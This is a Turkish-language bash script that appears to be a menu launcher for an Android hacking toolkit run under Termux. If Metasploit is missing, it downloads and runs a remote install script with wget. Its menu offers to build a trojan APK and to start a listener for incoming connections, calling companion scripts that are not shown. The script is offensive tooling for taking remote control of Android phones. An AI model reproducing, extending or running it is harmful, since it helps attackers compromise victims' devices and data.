#!/bin/bash
#Coded By = UmuT KaRa
if [[ $1 == güncelle ]];then
	cd files
	bash güncelleme.sh güncelle
	exit
fi
kontrol=$(which msfconsole |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[97mMETASPOLİT FRAMEWORK KURULUYOR"
	echo
	echo
	echo
	sleep 1
	printf "\e[33m[*] \e[97mKURULUM BİRAZ UZUN SÜREBİLİR LÜTFEN BEKLEYİNİZ.."
	echo
	echo
	echo
	pkg install -y wget&&wget https://raw.githubusercontent.com/hax4us/metasploit_Termux/master/metasploit.sh&&chmod 777 metasploit.sh&&bash metasploit.sh
	rm metasploit.sh
	echo
	echo
	echo
	printf "\e[32m[✓] \e[97mMETASPOLİT FRAMEWORK KURULUMU TAMAMLANDI"
	echo
	echo
	echo
	sleep 2
fi
kontrol=$(ls /sdcard |wc -m)
if [[ $kontrol == 0 ]];then
	termux-setup-storage
fi
cd files
bash güncelleme.sh
bash banner.sh
printf "

\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mTROJAN APK OLUŞTUR\e[97m

\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mDİNLEMEYE AL\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
echo
echo
echo
if [[ $secim == 1 ]];then
	bash Trojan-oluştur.sh
	cd ..
	echo
	echo
	echo
	printf "\e[32m[✓] \e[97mTROJAN APK OLUŞTURULDU"
	echo
	echo
	echo
	sleep 2
	bash Android-Hack.sh
elif [[ $secim == 2 ]];then
	bash Dinleme.sh
	cd ..
	sleep 2
	bash Android-Hack.sh
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!] \e[97mÇIKIŞ YAPILDI"
	echo
	echo
	echo
	exit
elif [[ $secim == d || $secim == D || $secim == düzenle || $secim == DÜZENLE ]];then
	cd ..
	vim Android-Hack.sh
	bash Android-Hack.sh
else
	echo
	echo
	echo
	printf "\e[31m[!] \e[97mHATALI SEÇİM \e[31m!!!\e[97m"
	echo
	echo
	echo
	cd ..
	sleep 1
	bash Android-Hack.sh
fi

